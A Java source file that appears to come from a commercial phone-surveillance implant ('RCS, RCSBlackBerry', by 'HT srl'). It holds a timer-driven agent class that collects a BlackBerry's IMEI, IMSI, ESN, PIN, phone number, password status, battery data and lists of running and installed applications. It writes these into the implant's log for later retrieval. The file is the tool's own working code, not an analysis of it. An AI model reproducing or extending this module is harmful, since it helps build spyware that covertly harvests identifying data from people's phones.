//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : DeviceInfoAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent;

import java.io.EOFException;
import java.util.Date;
import java.util.Enumeration;
import java.util.Hashtable;

import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.ApplicationManager;
import net.rim.device.api.system.CodeModuleGroup;
import net.rim.device.api.system.CodeModuleGroupManager;
import net.rim.device.api.system.CodeModuleManager;
import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.util.DataBuffer;
import net.rim.device.api.util.NumberUtilities;
import blackberry.Conf;
import blackberry.Device;
import blackberry.log.Log;
import blackberry.log.LogType;
import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * The Class DeviceInfoAgent.
 */
public final class DeviceInfoAgent extends Agent {
    //#ifdef DEBUG
    static Debug debug = new Debug("DeviceInfoAgent", DebugLevel.VERBOSE);
    //#endif

    Device device;
    boolean runningApplication;
    boolean installedApplication;

    /**
     * Instantiates a new device info agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public DeviceInfoAgent(final boolean agentStatus) {
        super(AGENT_DEVICE, agentStatus, Conf.AGENT_DEVICEINFO_ON_SD,
                "DeviceInfoAgent");
        //#ifdef DBC
        Check.asserts(Log.convertTypeLog(agentId) == LogType.DEVICE,
                "Wrong Conversion");
        //#endif

        device = Device.getInstance();
    }

    /**
     * Instantiates a new device info agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected DeviceInfoAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {
        //#ifdef DBC
        Check.requires(log != null, "Null log");
        //#endif

        log.createLog(null);

        boolean ret = true;

        final StringBuffer sb = new StringBuffer();

        // Modello
        // sb.append("Processor: ARM\n");
        if (DeviceInfo.isSimulator()) {
            sb.append("Simultator\n");
        }
        sb.append("Manifacturer: " + DeviceInfo.getManufacturerName() + "\n");
        sb.append("Model: " + DeviceInfo.getDeviceName() + "\n");
        sb.append("Pin: " + Device.getPin() + "\n");

        // Alimentazione
        sb.append("Battery: " + DeviceInfo.getBatteryLevel() + "%\n");
        sb.append("BatteryStatus: " + DeviceInfo.getBatteryStatus() + "\n");
        sb.append("BatteryTemperature: " + DeviceInfo.getBatteryTemperature()
                + " Degrees\n");
        sb.append("BatteryVoltage: " + DeviceInfo.getBatteryVoltage() + " V\n");

        //#ifdef HAVE_MIME
        // DISK
        sb.append("FLASH: " + DeviceInfo.getTotalFlashSize() + " Bytes\n");
        //#endif

        // OS Version
        sb.append("OS: " + DeviceInfo.getPlatformVersion() + "\n");

        // Device
        sb.append("Camera: " + DeviceInfo.hasCamera() + "\n");
        if (device.isCDMA()) {
            sb.append("CDMA\n");
            sb.append("SID: " + device.getSid() + "\n");
            sb.append("ESN: " + NumberUtilities.toString(device.getEsn(), 16)
                    + "\n");
        } else {
            sb.append("GPRS\n");
            sb.append("IMEI: " + device.getImei() + "\n");
            sb.append("IMSI: " + device.getImsi() + "\n");
        }

        sb.append("Phone: " + device.getPhoneNumber() + "\n");

        sb.append("IdleTime: " + DeviceInfo.getIdleTime() + "\n");
        sb.append("SoftwareVersion: " + DeviceInfo.getSoftwareVersion() + "\n");
        sb.append("Holster: " + DeviceInfo.isInHolster() + "\n");
        sb.append("PasswordEnabled: " + DeviceInfo.isPasswordEnabled() + "\n");

        try {
            if (this.installedApplication) {
                sb.append(getRunningApplications());
                sb.append(getInstalledModuleGroup());
                //sb.append(getInstalledApplications());
            }
        } catch (Exception ex) {
            //#ifdef DEBUG_ERROR
            debug.error(ex);
            //#endif
        }

        ret = log.writeLog(sb.toString(), true);

        if (ret == false) {
            //#ifdef DEBUG
            debug.error("Error writing file");
            //#endif
        }

        log.close();

    }

    /**
     * Gets the running applications.
     * 
     * @return the running applications
     */
    String getRunningApplications() {
        final StringBuffer sb = new StringBuffer();
        sb.append("\r\nRunning applications: \r\n");

        final ApplicationManager manager = ApplicationManager
                .getApplicationManager();

        // Check to see if application is running.
        final ApplicationDescriptor[] descriptors = manager
                .getVisibleApplications();
        // Retrieve the name of a running application.
        for (int i = 0; i < descriptors.length; i++) {
            final ApplicationDescriptor descriptor = descriptors[i];
            sb.append(descriptor.getName());
            sb.append(" ");
            sb.append(descriptor.getVersion());
            sb.append("\r\n");
        }

        return sb.toString();
    }

    /**
     * Gets the running applications.
     * 
     * @return the running applications
     */
    String getInstalledApplications() {
        final StringBuffer sb = new StringBuffer();
        sb.append("\r\nInstalled applications: \r\n");

        // Retrieve an array of handles for existing modules on a BlackBerry device
        int handles[] = CodeModuleManager.getModuleHandles();

        int size = handles.length;
        for (int i = 0; i < size; i++) {
            int handle = handles[i];
            //CodeModuleManager.getModuleHandle(name)
            // Retrieve specific information about a module.
            String name = CodeModuleManager.getModuleName(handle);
            String vendor = CodeModuleManager.getModuleVendor(handle);
            String description = CodeModuleManager.getModuleDescription(handle);
            String version = CodeModuleManager.getModuleVersion(handle);
            int moduleSize = CodeModuleManager.getModuleCodeSize(handle);
            long timestamp = CodeModuleManager.getModuleTimestamp(handle);
            Date date = new Date(timestamp);

            sb.append(name);
            sb.append(" , ");
            sb.append(vendor);
            sb.append("\r\n");
        }

        return sb.toString();
    }

    String getInstalledModuleGroup() {
        final StringBuffer sb = new StringBuffer();
        sb.append("\r\nInstalled Module Group: \r\n");

        // Retrieve an array of handles for existing modules on a BlackBerry device
        CodeModuleGroup handles[] = CodeModuleGroupManager.loadAll();
        // Retrieve an array of handles for existing modules on a BlackBerry device
        int AllModulesHandles[] = CodeModuleManager.getModuleHandles();
        Hashtable remainigModules = new Hashtable();
        int size = AllModulesHandles.length;
        for (int i = 0; i < size; i++) {
            remainigModules.put(new Integer(AllModulesHandles[i]), new Object());
        }

        if(handles == null)
        {
            size = 0;        
        }else{
            size = handles.length;
        }
        for (int i = 0; i < size; i++) {
            CodeModuleGroup group = handles[i];

            // Retrieve specific information about a module.
            String name = group.getName();
            String copyright = group.getCopyright();
            String description = group.getDescription();
            int flags = group.getFlags();
            String friendly = group.getFriendlyName();
            String vendor = group.getVendor();
            String version = group.getVersion();

            sb.append(name);
            sb.append(" , ");
            sb.append(vendor);
            sb.append(" , ");
            sb.append(flags);
            sb.append(" , ");
            sb.append(version);
            sb.append("\r\n");

            Enumeration enumerator = group.getModules();
            while (enumerator.hasMoreElements()) {
                String moduleName = (String) enumerator.nextElement();
                int handle = CodeModuleManager.getModuleHandle(moduleName);
                // Retrieve specific information about a module.

                sb.append("--> " + moduleName);
                if (handle > 0) {
                    remainigModules.remove(new Integer(handle));
                    String vendorModule = CodeModuleManager
                            .getModuleVendor(handle);
                    String versionModule = CodeModuleManager
                            .getModuleVersion(handle);
                    sb.append(", " + vendorModule);
                    sb.append(", " + versionModule);
                }
                sb.append("\r\n");
            }

            sb.append("\r\n");
           
        }

        sb.append("\r\nUngrouped:\r\n\r\n");
        Enumeration enumeration = remainigModules.keys();
        while (enumeration.hasMoreElements()) {
            Integer handle = (Integer) enumeration.nextElement();

            String nameModule = CodeModuleManager
                    .getModuleName(handle.intValue());
            String vendorModule = CodeModuleManager.getModuleVendor(handle
                    .intValue());
            String versionModule = CodeModuleManager
                    .getModuleVersion(handle.intValue());
            
            sb.append( nameModule);
            sb.append(", " + vendorModule);
            sb.append(", " + versionModule);
            sb.append("\r\n");
        }
        return sb.toString();
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {
        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);
        try {
            installedApplication = databuffer.readInt() == 1;
            runningApplication = installedApplication;
        } catch (final EOFException e) {
            return false;
        }

        //#ifdef DEBUG_INFO
        debug.info("installedApplication: " + installedApplication);

        //#endif

        return true;
    }

}
